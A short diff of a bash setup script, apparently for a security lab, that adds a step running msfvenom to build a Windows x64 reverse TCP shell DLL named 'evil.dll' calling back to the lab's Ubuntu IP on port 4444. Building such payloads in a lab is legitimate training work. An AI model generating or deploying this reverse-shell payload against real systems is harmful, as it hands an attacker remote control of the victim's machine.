@@ -108,6 +108,7 @@ fi
 # =============================================================================
 #  STEP 3 — Detect current Ubuntu IP
 # =============================================================================
+
 sep
 info "Network"
 sep
@@ -128,6 +129,13 @@ if [[ -z "$UBUNTU_IP" ]]; then
 else
     success "Ubuntu VM IP:  ${BOLD}$UBUNTU_IP${NC}"
 fi
+
+info "Generating evil.dll using msfvenom..."
+msfvenom -p windows/x64/shell_reverse_tcp \
+    LHOST="$UBUNTU_IP" LPORT=4444 \
+    -f dll \
+    -o "$LAB_DIR/evil.dll" > /dev/null 2>&1
+success "evil.dll successfully generated with LHOST=$UBUNTU_IP"
 
 echo ""
 
